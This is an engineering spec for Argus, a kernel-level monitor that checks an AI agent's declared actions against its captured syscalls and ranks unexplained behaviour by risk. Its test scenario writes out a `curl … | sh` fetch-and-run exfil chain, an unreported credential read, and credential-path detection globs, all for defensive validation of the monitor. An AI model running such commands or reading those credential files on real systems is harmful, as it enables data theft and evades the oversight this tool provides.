# SPEC_02 — Trustworthy Unexplained-Behaviour: Complete Capture, Productise the Gap

**Subsystem:** `packages/ingestion/src/event-filter.ts` (capture scope) · `packages/api/src/correlation/**`
(identity + unexplained productisation) · `k8s/policies/**` + `policies/**` (TracingPolicies, D14) ·
`sample-agent/argus_sdk.py` (host-PID + OTel-GenAI format) · `packages/eval/**` (re-capture validation).
**Last updated:** 2026-06-18
**Status:** 🟢 **Moat delivered — core scope shipped to `main` (PRs #9, #10).** Slices 1–6 + 2b done:
trustworthy pod-scoped capture (Gap A closed, verified on real data) + the unexplained gap as a
product (coverage score + risk-ranked triage + configurable profile + declared∪config egress) + D14
write attribution (0.80 on real data). **Slice 7 (D15) spiked → deferred; Slice 8 (OTel) deferred** —
both tracked as SPEC_03 candidates (see Plan + ledger). The goal — make the intent-vs-behavior gap
trustworthy and actionable — is met; the remaining slices are precision/plumbing, not the moat.

---

## Goal

Make Argus's one differentiated claim — **the intent-vs-behaviour gap** (`detectUnexplained`) —
*trustworthy*, then *actionable*. SPEC_01 made attribution **measurable**; it also proved that the
remaining accuracy is blocked not by scoring but by **missing/at-risk capture**: the process tree
that links `agent → sh → curl` is dropped by a binary allowlist, write events carry no path
(**D14**), and events lack the agent's host/namespaced PID (**D15**). Until capture is complete and
attributable, "unexplained" is not defensible — and `detectUnexplained` is still a 30-line correlator
helper, not a product.

This spec delivers, in dependency order:

1. **Capture completeness** — pod-scoped ingestion so a spawned tool's *whole* process tree is
   captured, not just its syscalls. The foundation everything else rests on.
2. **The gap as a product** — `detectUnexplained` becomes a per-session **coverage score** + a
   **risk-ranked triage feed**, where `risk = unexplained × resource sensitivity`. Scored on the
   axis nobody else has (the claim gap), not generic anomaly detection.
3. **The telemetry that makes attribution real** — D14 (write fd→path) and D15 (host/namespaced
   PID), where **D15 is elevated to the portable identity primitive** that lets attribution work
   beyond pod-name matching (and unlocks non-k8s installs later).
4. **Interop** — the SDK emits **OpenTelemetry GenAI `gen_ai.*` spans** (behind the experimental
   stability opt-in) plus an Argus extension namespace, so declared intent rides the standard rail.

Why it matters: app-layer LLM-observability tools (Langfuse, Phoenix, LangSmith, Helicone) have
**intent but no kernel ground truth**; eBPF tools (Falco, Tetragon) have **truth but no intent**;
AgentSight has truth + *inferred* intent and is observe-only. Argus is the only design correlating
**declared intent ↔ syscall ground truth**. That moat is worthless if capture is leaky — so this
spec hardens it.

---

## Capture-first method (the load-bearing decision)

**Nothing in this spec is specified or accepted against assumptions — every gap is grounded in a
fresh real capture first.** SPEC_01 seeded fixtures from one real run; SPEC_02 re-runs the capture
to (a) observe the three gaps with our own eyes and (b) prove each fix against a *re-captured*
corpus (the acceptance D14/D15 already demand).

- **Reference install for capture:** the **Kubernetes path** (`pnpm k8s:setup` → kind + Tetragon +
  Postgres + Redis + Argus), per the locked decision below. This is the proven, reproducible
  correlation path today (`README.md:51`, pod-scoped join). Bare-host is a deliberate fast-follow,
  not in this spec.
- **The capture scenario** must include a child-process exfil chain — an instrumented agent action
  that spawns `sh -c "curl <dest> | sh"` — so the process-tree gap is observable, plus an
  unreported credential read and unreported writes.
- **Validation discipline:** D14/D15/filter fixes are each proven by a **fresh re-capture** showing
  the previously-lost events now captured and attributable, folded into `packages/eval` as a
  committed corpus so the gate protects the gain (consistent with SPEC_01's offline-eval doctrine —
  the live capture grounds the fixture; the gate runs on the frozen fixture).

---

## Baseline findings (Slice 1 / T0 — observed on real data, 2026-06-15)

Captured a real kind+Tetragon session: `long_running_agent.py`, 15 cycles, **real Groq calls**,
with buried undeclared behaviour (credential read, `sh -c "curl … | sh"` chain, unreported write).
**25,133 raw kernel events; 2,323 ingested for the agent pod** (host PID `14038`). Frozen as
`packages/eval/fixtures/spec02/baseline-capture.json`; pinned by `src/spec02-baseline.test.ts`.

- **Gap A (process tree) — confirmed.** The kernel saw the full `python → sh → sh → curl` exfil
  chain; Argus ingested **only the 2 `python` exec events, zero `sh`/`curl`** — the binary allowlist
  drops the spawned tree. → **T1 / Slice 2**.
- **Gap B (write path) — confirmed.** 702 `__arm64_sys_write` events carry only a `sizeArg` (byte
  count), **no fd/path** — writes are unattributable to a file. → **T3 / D14**.
- **Gap C (identity PID) — confirmed.** SDK declared the agent at **container PID 1**; events carry
  **host PID 14038** — exact-PID identity match can never fire. → **T4 / D15**.
- **Honest caveat (egress noise — does not affect the gaps).** A work VPN was toggled off/on
  mid-capture, which disrupted *external egress only*: some `httpbin.org` `network_request` actions
  failed (503/timeout) and a few actions correlated zero events. Critically, **the agent→api control
  plane was never disrupted** (0 failed SDK POSTs), so the declared-action record is complete and
  there is **no false-unexplained contamination**. The three gaps rest on *local* syscalls (exec
  tree / write args / PID) and are unaffected. Separately, the exfil `tcp_connect` to
  `169.254.169.254` produced no connect event (link-local, unroutable in kind), so Gap A rests on the
  captured `sh`/`curl` *exec* tree. **Action:** the Slice 2 (T1) re-capture must run with the VPN
  stable and target a **routable, non-allowlisted** exfil destination, to also exercise the
  unexplained-connect risk path (T2). Arch is **arm64** (`__arm64_sys_*`), confirming D11.

## Locked decisions (from the Define interview, 2026-06-15)

| Decision | Choice | Rationale |
|---|---|---|
| **Scope** | Capture-completeness + productise `detectUnexplained` + D14 + D15 + SDK OTel format. **UI/dashboard deferred.** | "Do everything except UI"; the moat is the API + scoring, not the dashboard. |
| **Install + identity** | Harden **k8s pod-scoped** as the reference now; build **host/namespaced PID (D15) as a first-class portable identity primitive**. Bare-host = fast-follow. | Research: multi-path install is the industry norm, but Argus's correlation is pod-scoped today; D15 is the portable-identity primitive that future-proofs install without re-architecting attribution twice. |
| **Risk profile** | **Consumer-configurable sensitivity profile**, config-driven from day one; ship a default, allow override of tiers/weights/globs/egress baseline. Egress allowlist = **declared ∪ config**. | "No magic values" taken to its conclusion — a consumer sets their own profile via config, not a code change. |
| **SDK format** | **OTel-GenAI hybrid** — emit `gen_ai.*` spans behind `OTEL_SEMCONV_STABILITY_OPT_IN`, plus an `argus.*` extension namespace for syscall-correlation fields. Pin against `open-telemetry/semantic-conventions-genai`. | Interop with the OTLP ecosystem; OTel GenAI is still "Development"/experimental and the repo just relocated, so opt-in + extension is the defensible middle. |
| **Enforcement** | **Deferred to SPEC_03.** When built: **Override/return-error-first, never SIGKILL.** | Research (Tetragon docs): SIGKILL is TOCTOU-unsafe ("a SIGKILL in a write() does not guarantee the data won't be written"). "Argus does not kill processes" → ADR. Enforcing on leaky capture is dangerous; capture must be solid (this spec) first. |
| **Positioning vs AgentSight** | Argus must **demonstrate** declared-intent yields higher-precision unexplained detection than inferred intent — an eval requirement, not a slogan. | AgentSight is the credible "no SDK needed" counter-thesis (eBPF, instrumentation-free, observe-only). |

---

## Tasks (vertical, independently shippable slices)

### T0 — Baseline real-data capture & gap characterisation
Run the reference k8s install, execute an instrumented agent that performs a credential read,
unreported writes, and a `sh -c "curl … | sh"` child-exfil chain under Tetragon. Export the real
events and **write down, from observation**, the three gaps: (a) child `sh`/`curl` `process_exec`
events dropped by the binary allowlist → broken process tree; (b) `*_sys_write` events with no
fd/path; (c) the agent's own syscalls failing exact-PID match because the SDK reports container
PID 1. Freeze the raw capture as the SPEC_02 baseline corpus.

### T1 — Pod-scoped capture completeness (TWO layers — discovered in Build, 2026-06-18)
Capture completeness is gated at **two** layers, both currently a binary allowlist:
- **T1a — ingestion (`event-filter.ts`).** Replace the binary allowlist with **pod-scoped**
  ingestion: ingest **all** events whose process is in a tracked agent pod, using `proc.pod`
  (name + namespace). Keep `DENY_POD_PREFIXES` (argus's own pods, postgres, redis) and
  `DENY_BINARIES` (infra noise); add `DENY_NAMESPACES` (kube-system etc.). Preserve the binary
  allowlist as a **fallback only when no pod metadata is present** (compose/host mode). This recovers
  the `agent → sh → curl` **exec tree** (and curl's command line via exec args). *(As-built asymmetry:
  the kernel layer (T1b) scopes by the `argus.dev/track` pod **label**, but Tetragon events carry no
  pod labels — only `namespace`/`name` — so the ingestion filter scopes by a deny-list, not the same
  label. In a shared cluster this can ingest exec/exit from other non-system pods; acceptable here,
  noted for the bare-host follow-up.)*
- **T1b — kernel (`k8s/policies/*.yaml` TracingPolicies).** Both policies scope every kprobe
  (`fd_install`, `sys_write`, `tcp_connect`, `tcp_sendmsg`) with `matchBinaries: In [python,node]`,
  so Tetragon **never emits** them for `sh`/`curl` — the spawned tool's network/file *behaviour* is
  invisible at the kernel. Replace the binary restriction with a **`podSelector`** label on agent
  pods (or a namespaced policy), so all binaries in a tracked agent pod are traced. Validated by
  re-capture (curl's `tcp_connect` now appears).

### T2 — Productise `detectUnexplained` (coverage + risk + triage)
Turn the helper into the headline product:
- **Coverage score** per session: explained / unexplained / total + a `coverage_ratio` and an
  aggregate `risk_score`.
- **Risk scoring:** for each unexplained event, `risk = sensitivity(resource) × (1 − best_confidence)`
  (range 0–1; the `(1 − best_confidence)` term grades *how* unexplained — a 0.69 near-miss scores
  below a 0.0 orphan). `sensitivity` is a tiering of the resource touched (path or network dest):
  - **HIGH (1.0)** — credential/secret reads (`**/.ssh/**`, `**/.aws/**`, `**/.kube/**`,
    `/etc/shadow`, `**/*.pem`, `**/*.key`, `**/.netrc`, `**/.git-credentials`); **and** `tcp_connect`
    to a destination **not** on the session's egress allowlist.
  - **MEDIUM (0.5)** — any other file path (the default file tier; e.g. a `file_write` to `/app/...`).
  - **LOW (0.1)** — `/tmp` & `/proc/self` paths, **loopback / `0.0.0.0` connects**, allowlisted
    destinations; **default floor** for anything unmatched.
  - **Shipped classifier is path/destination-based (as-built note).** It keys on the *resource* (file
    path or socket `daddr`), **not** on read-vs-write, and treats every allowlisted (or loopback)
    destination as LOW. Two spec'd refinements are **deliberately deferred** as they need per-event
    action context the pure scorer doesn't have: (a) read/write-specific tiers, and (b)
    "allowlisted-but-no-*active*-action → MEDIUM". The default profile errs toward fewer false
    positives (loopback/allowlisted → LOW).
- **Sensitivity is a configurable profile, not hardcoded.** Tiers, weights, path globs, and the
  egress baseline load through a **profile schema** with a shipped default; a consumer of Argus can
  supply their own profile to override any of it. No magic values in code (code-craft).
- **Egress allowlist = declared ∪ config.** A destination is "allowlisted" for a session if the agent
  **declared** it (via a `network_request` action) **or** it is on the static config baseline. An
  unexplained connect to anything in neither set is HIGH — scoring on the claim gap.
- **Triage feed:** extend `GET /sessions/:id/unexplained` (`packages/api/src/routes/unexplained.ts`)
  to return unexplained events ranked by `risk` desc, each carrying the resource, its sensitivity
  tier, the risk score, and the closest (failed) correlation. UI deferred — the API is the deliverable.

### T3 — D14: write events carry an fd→path (TracingPolicy + ingestion)
Change the Tetragon TracingPolicy (`k8s/policies/**`, `policies/**`) to capture the write fd and
resolve it to a path, and thread fd→path through ingestion so `*_sys_write` events become true
`file_write` matches. The policy ships **inside the install** (applied by `k8s:setup`), not by hand.

### T4 — D15: host/namespaced PID as the portable identity primitive
The SDK reports the agent's **host PID** (or Tetragon emits the namespaced PID on each event), and
`process-identity` matching keys on it so the agent's own syscalls exact-match (confidence 1.0)
instead of colliding on container PID 1. Identity is **no longer pod-name-only** — this is the
primitive a future bare-host install reuses.

### T5 — SDK emits OTel-GenAI hybrid format
`argus_sdk.py` emits OpenTelemetry GenAI `gen_ai.*` spans (operation names mapped from Argus action
types — e.g. `llm_call → invoke_agent`/`chat`, tool use → `execute_tool`), behind
`OTEL_SEMCONV_STABILITY_OPT_IN=gen_ai_latest_experimental`, plus an `argus.*` extension namespace for
the session/action-correlation fields OTel has no concept of. The API ingests the hybrid shape.

---

## Done (acceptance — each becomes a test)

- [ ] **T0 — gaps observed, not assumed.** A committed SPEC_02 baseline corpus from a fresh capture,
  and a written characterisation in this spec confirming all three gaps from the real data. *(test:
  the corpus exists and contains the child `curl` syscall event AND lacks its parent `sh`/`curl`
  exec events under the current filter — proving the tree break.)*
- [ ] **T1 — process tree is whole.** `shouldIngest` returns `true` for a child `sh`/`curl`
  `process_exec` event whose process is in a tracked agent pod, and still `false` for argus-own-pod
  and infra-noise events. *(test: unit tests over synthetic `TetragonEvent`s for the agent-child,
  argus-pod, and infra-noise cases.)*
- [ ] **T2 — the gap is a risk-ranked product.** `GET /sessions/:id/unexplained` returns
  `{ total, explained, unexplained, coverage_ratio, risk_score, events: [...] }` with events sorted
  by `risk` desc; an unexplained credential read outranks an unexplained `/tmp` write. *(tests:
  unit on the risk function — HIGH-sensitivity unexplained event scores > LOW; integration on the
  endpoint contract; an unexplained `~/.ssh/id_rsa` read ranks above an unexplained `/tmp/x` write.)*
- [ ] **T2 — sensitivity is a configurable profile.** A default profile ships; a consumer-supplied
  profile overrides tiers/weights/globs/egress baseline through the profile schema, and the engine
  scores against the supplied profile. *(test: a custom profile that demotes `~/.ssh` to LOW changes
  that event's rank; an invalid profile fails validation with a clear error.)*
- [ ] **T2 — egress allowlist is declared ∪ config.** A connect to a session-declared destination is
  not HIGH; a connect to a config-baseline destination is not HIGH; a connect to neither is HIGH.
  *(test: three connects — declared, config, neither — score LOW/LOW/HIGH respectively.)*
- [ ] **T3 — writes become attributable.** In a fresh re-capture, a `*_sys_write` event carries an
  fd→path and the correlator attributes it to the reported `file_write` action at confidence ≥ the
  committed threshold (0.7). *(test: re-captured fixture through the real engine; the write matches.)*
- [ ] **T4 — the agent's own syscalls exact-match.** With host/namespaced PID captured, the agent's
  reported actions exact-PID-match their syscalls at confidence 1.0 in a fresh re-capture, and the
  identity signal no longer depends on pod-name alone. *(test: re-captured fixture; exact-PID path
  fires; an identity unit test keyed on host PID.)*
- [ ] **T5 — interop format emitted.** With the opt-in set, the SDK emits valid `gen_ai.*` spans for
  each action type plus `argus.*` correlation fields, and the API correlates them identically to the
  legacy format. *(tests: SDK emits spec-conformant span attributes; API ingestion parity test
  legacy-vs-OTel.)*
- [ ] **Gate stays green.** `keel eval` passes; SPEC_01's committed baseline (attribution F1 0.90 /
  unexplained 93.3% precision / 100% recall) does not regress, and new fixtures extend it.

---

## Plan (slice breakdown — `/keel:build` walks this top-down)

Dependency-ordered, value-first vertical slices. Each ships independently, fits the PR-size budget,
and traces to a `## Done` line. **Close calls:** T2 (Slices 3–5) lands before D14/D15 — it's
install-agnostic, offline, and demoable on the reads + network data we already capture, so the
headline product isn't blocked behind flaky live-capture slices; profile + risk function are one
slice (the profile is how the risk function gets its weights). **Top risks:** live capture is
environment-/arch-coupled (mitigate: capture once, freeze as fixture, gate runs offline); **D15 is
the scary slice** — host-mappable PID inside a container may need Downward API / `/proc` mapping /
Tetragon host-PID join and may warrant a spike; D14 fd→path depends on Tetragon arg extraction in
our kernel build.

- [x] **Slice 1 — Baseline real-data capture & gap characterisation** *(T0)* — **done 2026-06-15.**
  Frozen `packages/eval/fixtures/spec02/baseline-capture.json` + `src/spec02-baseline.test.ts` (5
  tests) pin all three gaps from a real 15-cycle Groq session; production-shaped
  `long_running_agent.py` + `llm_providers.py` + `k8s/long-agent-job.yaml` added. Findings recorded
  above. (Gap A rests on the captured sh/curl exec tree; exfil connect to the link-local IP produced
  no connect event — re-capture against a routable dest in a later slice.)
- [x] **Slice 2 — Pod-scoped ingestion filter** *(T1a)* — **done 2026-06-18.** `event-filter.ts`
  pod-scoped (ingest the whole tracked-agent tree; deny argus-own/infra/system-ns; legacy allowlist
  kept as no-pod fallback). `event-filter.test.ts` (10 unit tests, green).
- [x] **Slice 2b — Pod-scoped TracingPolicy** *(T1b, discovered in Build)* — **done 2026-06-18.**
  Both policies re-scoped from `matchBinaries` to the `argus.dev/track` `podSelector`; agent jobs
  labelled. **Verified on a fresh re-capture (no VPN, routable exfil dest):** the agent's `sh`/`curl`
  exec are now ingested (3, was 0) and curl's `tcp_connect` to `104.20.23.154:80` is captured (curl
  kprobes were 0 before). Frozen as `fixtures/spec02/postfix-capture-slice2.json` +
  `src/spec02-slice2.test.ts` (4 tests, green).
- [x] **Slice 3 — Risk function + configurable sensitivity profile** *(T2.1)* — **done 2026-06-18.**
  `correlation/risk.ts`: `risk = sensitivity × (1 − best_confidence)`; HIGH/MED/LOW tiers from a
  consumer-overridable `SensitivityProfile` (shipped `DEFAULT_SENSITIVITY_PROFILE`, manual
  `parseSensitivityProfile` validator). Resource extraction factored into `correlation/resource.ts`
  (file_path + network_destination signals now reuse it — DRY). `__tests__/risk.test.ts` (8 tests):
  credential read > /tmp write, graded by confidence, profile override, invalid-profile rejection.
- [x] **Slice 4 — Egress allowlist (declared ∪ config)** *(T2.2)* — **done 2026-06-18.**
  `correlation/egress.ts`: `declaredEgressDestinations(hints)` pulls IPs from the session's
  `network_request`/`llm_call` actions; `buildEgressAllowlist(declared, profile)` unions them with the
  config baseline. `__tests__/egress.test.ts` (3 tests): declared→not HIGH, config→not HIGH,
  neither→HIGH.
- [x] **Slice 5 — Coverage score + risk-ranked triage feed** *(T2.3)* — **done 2026-06-18.**
  `correlation/triage.ts` `buildTriageReport` (pure); `GET /sessions/:id/unexplained` now returns
  `{ threshold, total, explained, unexplained, coverage_ratio, risk_score, events[] }` with events
  risk-ranked and annotated (resource, sensitivity, best_confidence). Egress allowlist = the
  session's declared dests ∪ config. Tests: `triage.test.ts` (4) + HTTP contract (`ssh` read ranks
  above `/tmp` write; zero-event → coverage 1.0, empty feed).
- [x] **Slice 6 — D14: write events carry fd→path** *(T3)* — **done 2026-06-18.** `sys_write` arg 0
  re-typed `fd`→`int` (the `fd` type resolved to empty) so writes carry the fd number; a per-process
  `fd→path` resolver (`correlation/fd-path.ts`, from `fd_install`) resolves each write's fd. Wired
  into **both** the triage (`resolveFdPaths` → write gets a file resource + sensitivity) and the
  **correlator** (`injectResolvedPath` enriches candidates so the `file_path` signal attributes the
  write). **Reproducible evidence:** `fixtures/spec02/d14-write-resolution.json` (real captured
  checkpoint opens + writes) + `spec02-d14.test.ts` resolve real writes to their paths offline.
  **Live-observed (this re-capture, not a committed fixture):** declared `checkpoint` `file_write`
  actions attributed 105 `__arm64_sys_write` events at confidence 0.80 (≥ 0.7) — previously
  false-unexplained. Tests: `fd-path.test.ts` (6) + triage write-resolution + the real-data fixture
  test. **Known limit:** the correlator resolves fds only within an action's ±1s candidate window, so
  a long-lived fd opened in an earlier window won't resolve there (triage, which scans the whole
  session, still does); fine for the open→write→close pattern, noted for the bare-host follow-up.
  **Depends on:** 1, 2
- [~] **Slice 7 — D15: host/namespaced PID as portable identity** *(T4)* — **SPIKED → DEFERRED
  (2026-06-18). Not lost — see "D15 spike findings" below.** Investigated on real data; the clean
  fixes are unavailable and the viable workaround is runtime-coupled and precision-only, so it does
  not advance the goal. Tracked as a **SPEC_03 candidate**.
- [ ] **Slice 8 — SDK emits OTel-GenAI hybrid format** *(T5)* — **DEFERRED (2026-06-18).** Adoption
  plumbing (interop), not the moat — "table-stakes, not a differentiator." Tracked as a **SPEC_03
  candidate**; design is in "Locked decisions" (OTel-GenAI hybrid). · **Delivers:** `gen_ai.*` spans
  (behind `OTEL_SEMCONV_STABILITY_OPT_IN`) + `argus.*` extension; API ingests both.

### D15 spike findings (so the investigation is not re-derived)

**Goal of D15:** the agent's *own* syscalls should exact-match identity (1.0) and be distinguishable
from spawned-tool syscalls within the same pod. Today the SDK reports container PID 1; Tetragon
events carry host PIDs, so the exact-PID path never fires.

- **Ruled out — Tetragon namespaced PID.** Tetragon's `pod.container.pid` is **not emitted** in this
  kind/containerd setup (0/66 `process_exec` events carry it). Not available without runtime config
  kind/containerd doesn't support out of the box.
- **Ruled out — SDK self-reports its host PID.** Impossible from inside the container's PID namespace
  (`getpid()` = 1). The only route is `hostPID: true` on the agent pod — an **isolation regression on
  the observed workload**, unacceptable for a security tool.
- **Validated approach — observer-side pod-root resolution.** The agent is the pod's root process:
  its `python` `process_exec` parent is the container runtime (`containerd-shim-runc-v2`, host pid
  outside the pod), while the agent is a distinct host pid. So Argus can resolve the agent's host PID
  once per session = the in-pod `process_exec` whose parent is the runtime, then exact-match the
  agent's syscalls (1.0) and its children (0.7).
- **Why deferred:** (1) **precision-only** — unexplained detection keys on *action correlation*, not
  identity; the exfil was caught and declared actions attributed with identity at the weak pod-level
  score, so D15 changes confidence, not capability; (2) the workaround is **runtime-coupled**
  (containerd parent heuristic) which **fights the "works out of the box for anyone" north-star**;
  (3) it touches the SPEC_01 scoring engine + the committed eval baseline. Net: not worth its cost
  against the goal right now.

**Cross-spec note (2026-06-19, SPEC_03 Slice 2):** the live demo *sidesteps* D15 in compose by
running the agent with `pid: host`, so the SDK's `os.getpid()` is the host PID Tetragon captures and
exact-match identity fires without the runtime-coupled resolution above (D15 remains unsolved for
isolated/production deployments). That slice exported `buildCandidateQuery` from
`packages/api/src/correlation/correlator.ts` purely to unit-test compose-mode candidate selection
(PID-keyed when there is no pod) — **no scoring or behavior change** to this spec's engine or baseline.

---

## Non-goals (explicit)

- **No UI / dashboard** — `packages/dashboard` is untouched; the triage feed is API-only.
- **No enforcement** — no kill, no return-error, no policy gating. SPEC_03. (And never SIGKILL.)
- **No bare-host install** — k8s reference only; D15 makes bare-host *possible* later, not delivered.
- **No deterministic replay / OTel *exporter* backend** — format alignment only, not a full OTLP
  export pipeline.

---

## Defect / decision ledger references

- **D14** (SPEC_01) — write events need fd/path to be attributable → **T3**, done (0.80 on real data).
- **D15** (SPEC_01) — capture agent host/namespaced PID → **T4**, spiked → deferred (see findings).
- The pod-scoped filter gap (binary allowlist drops the process tree) → **T1**, done.

## SPEC_03 candidates (carried forward — do not forget)

- **D15 — agent host-PID identity** (precision): implement the validated observer-side pod-root
  resolution; make it runtime-agnostic (don't hard-code the containerd parent). See "D15 spike findings".
- **OTel-GenAI hybrid SDK format** (interop/adoption): per "Locked decisions".
- **Intent-scoped enforcement** (the deferred moat-extension): **Argus does not kill processes** —
  return-error-first, never SIGKILL (Tetragon TOCTOU risk). ADR-worthy when SPEC_03 opens.
- **Bare-host install** (reach/north-star): rides on D15's portable identity.

---

## Open questions (interview)

- ✅ **Resolved (2026-06-15)** — risk model: graded `risk = sensitivity × (1 − best_confidence)`;
  HIGH/MEDIUM/LOW tiers as listed in T2; **sensitivity is a consumer-configurable profile** (default
  shipped, override via profile schema); **egress allowlist = declared ∪ config**.

No open markers remain.
